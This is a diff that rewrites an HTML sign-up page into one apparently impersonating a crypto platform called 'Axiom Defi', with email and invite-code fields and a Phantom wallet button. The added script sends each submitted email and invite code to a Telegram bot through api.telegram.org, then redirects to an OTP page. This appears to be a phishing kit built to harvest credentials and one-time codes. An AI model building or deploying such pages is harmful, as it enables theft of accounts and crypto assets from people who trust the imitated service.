@@ -1,20 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up Page</title>
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Axiom Defi</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('signup.png') no-repeat center center/cover;
+      color: #fff;
+      height: 92vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal {
+      background: rgba(0,0,0,0.92);
+      width: 300px;
+      max-width: 95%;
+      padding: 26px;
+      border-radius: 6px;
+      box-shadow: 0 4px 2px rgba(0,0,0,0.9);
+    }
+
+    .modal h2 {
+      text-align: center;
+      margin: 10px 0 20px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #999999;
+    }
+
+    .input-label {
+      display: block;
+      margin: 8px 0 4px;
+      font-size: 13px;
+      color: #ccc;
+      font-weight: 500;
+    }
+
+    .modal input {
+      width: 95%;
+      padding: 9px;
+      margin: 6px 0 14px;
+      border: 1px solid #888888;
+      border-radius: 50px;
+      background: rgba(0,0,0,1);
+      color: #fff;
+      font-size: 14px;
+    }
+    .modal input::placeholder { color: #bbb; }
+
+    .btn-primary {
+      width: 103%;
+      padding: 8px;
+      margin: 2px 0;
+      background: #162DAF;
+      border: none;
+      border-radius: 30px;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .divider {
+      text-align: center;
+      margin: 20px 0;
+      color: #aaa;
+      font-size: 14px;
+      position: relative;
+    }
+    .divider:before, .divider:after {
+      content: "";
+      display: inline-block;
+      width: 30%;
+      height: 1px;
+      background: #444;
+      margin: 0 10px;
+      vertical-align: middle;
+    }
+
+    .btn-alt {
+      width: 100%;
+      padding: 4px;
+      margin: 8px 0;
+      border-radius: 35px;
+      border: 1px solid #2c303a;
+      background: hsl(223, 9%, 20%);
+      color: #FFFFFF;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .btn-alt img {
+      width: 23px;
+      height: 23px;
+      margin-right: 3px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 15px;
+      color: #aaa;
+    }
+    .footer a {
+      color: #0056ff;
+      text-decoration: none;
+    }
+  </style>
 </head>
-<body class="signup-page">
+<body>
+  <div class="modal">
+    <h2>Sign Up</h2>
 
-    <div class="signup-input-container">
-        <input type="email" placeholder="Enter your email" class="input-box email-box">
-    </div>
+    <!-- Form -->
+    <form id="signupForm">
+      <label for="email" class="input-label">Email</label>
+      <input id="email" name="email" type="email" placeholder="Enter email" required>
 
-    <div class="signup-text">
-        <a href="login.html" class="signup-button">Sign Up</a>
-    </div>
+      <input id="invite" name="invite" type="text" placeholder="Invite code (optional)">
 
+      <button type="submit" class="btn-primary">Sign Up</button>
+    </form>
+
+    <div class="divider">Or Sign Up</div>
+
+    <button class="btn-alt">
+      <img src="goggle.png" alt="Google">
+      Continue with Google
+    </button>
+
+    <button class="btn-alt">
+      <img src="phantom.png" alt="Phantom">
+      Connect with Phantom
+    </button>
+
+    <div class="footer">
+  Already have an account? <a href="login.html">Login</a><br><br>
+  By creating an account, you agree to Axiom's 
+  <a href="#">Privacy Policy</a> and 
+  <a href="#">Terms of Service</a>
+</div>
+  </div>
+
+  <script>
+    // Telegram bot settings
+    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    const CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+    const form = document.getElementById("signupForm");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = form.email.value;
+      const invite = form.invite.value;
+
+      const message = `📩 New Signup\n\nEmail: ${email}\nInvite Code: ${invite || "None"}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          // Redirect to OTP page after success
+          window.location.href = "otp.html";
+        } else {
+          console.error("Telegram error:", data);
+          alert("Signup failed, try again.");
+        }
+      })
+      .catch(err => {
+        console.error("Fetch error:", err);
+        alert("Network error, try again.");
+      });
+    });
+  </script>
 </body>
 </html>
